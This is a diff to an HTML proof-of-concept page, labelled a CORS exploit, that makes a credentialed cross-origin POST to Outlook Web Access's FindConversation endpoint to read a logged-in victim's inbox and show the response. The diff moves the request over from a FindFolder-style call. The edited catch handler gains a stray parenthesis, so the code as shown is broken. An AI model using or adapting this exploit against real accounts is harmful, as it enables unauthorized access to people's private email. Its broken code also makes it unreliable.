@@ -1,26 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>FindFolder CORS Exploit</title>
+  <title>OWA FindConversation CORS Exploit</title>
 </head>
 <body>
-  <h1>Exploit: POST to FindFolder</h1>
+  <h1>Exploit: POST to FindConversation</h1>
   <button onclick="exploit()">Send Exploit Request</button>
 
   <pre id="output">Waiting...</pre>
 
   <script>
     function exploit() {
-      fetch("https://outlook.office365.com/api/beta/me/translateExchangeIds?n=88", {
+      fetch("https://outlook.office365.com/owa/service.svc?action=FindConversation&app=Mail&n=76", {
         method: "POST",
         credentials: "include",
         headers: {
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          // Adjust based on what FindFolder expects
-          FolderId: "inbox",
-          IncludeSubfolders: true
+          // This body will likely be ignored or rejected unless correct structure is used
+          SortOrder: "Descending",
+          ViewFilter: "All",
+          FolderId: {
+            Id: "inbox"
+          }
         })
       })
       .then(response => {
@@ -33,7 +36,7 @@
         document.getElementById("output").textContent = "Response:\n" + data;
       })
       .catch(error => {
-        document.getElementById("output").textContent = "Error:\n" + error;
+        document.getElementById("output").textContent = "Error:\n" + error);
       });
     }
   </script>
